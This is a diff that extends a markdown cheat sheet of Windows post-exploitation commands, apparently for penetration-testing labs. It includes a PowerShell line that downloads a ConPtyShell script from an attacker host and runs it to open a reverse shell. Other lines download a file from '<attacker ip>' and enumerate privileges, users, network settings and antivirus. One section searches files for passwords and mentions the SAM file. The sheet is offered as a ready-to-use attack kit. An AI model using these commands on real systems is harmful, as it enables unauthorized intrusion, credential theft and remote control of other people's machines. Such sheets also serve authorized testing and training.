@@ -88,3 +88,76 @@ Invoke-Script IP Port
 
 IEX(IWR [http://IP:80/Invoke-ConPtyShell.ps1](http://IP/Invoke-ConPtyShell.ps1) -UseBasicParsing); Invoke-ConPtyShell -Upgrade -Rows 27 -Cols 129
 ```
+
+System enumeration (Kernel Exploits)
+
+```
+hostname
+systeminfo
+systeminfo | grep version
+wmic qfe
+wmic qfe get caption, descrition, install on, hotfix
+wmic logicaldisk
+wmic logicaldisk get caption, description, provdername
+
+Go to Links:
+https://github.com/SecWiki/windows-kernel-exploits
+
+```
+
+User enumeration
+
+```
+whoami
+whoami /priv
+whoami /groups
+net user
+net user username
+net user administrator
+net localgroup
+net localgroup administrators
+
+```
+
+Network enumeration
+
+```
+ipconfig
+ipconfig /all
+arp -a
+route print
+netstat -ano
+
+```
+
+Password hunting
+
+```
+cd ..
+SAM file 
+findstr /si password *.txt (Only searching within current directory)
+findstr /si password *.txt *.ini *.config
+
+Go to Links:
+https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
+
+```
+
+AV enumeration
+
+```
+sc query windefend
+sc queryex type= service
+netsh advfirewall firewall dump
+netsh firewall show state
+netsh firewall show config 
+
+
+```
+
+Misc
+
+```
+Invoke-WebRequest -OutFile file.exe http://<attacker ip>:<attacker port>/file.exe
+```
+
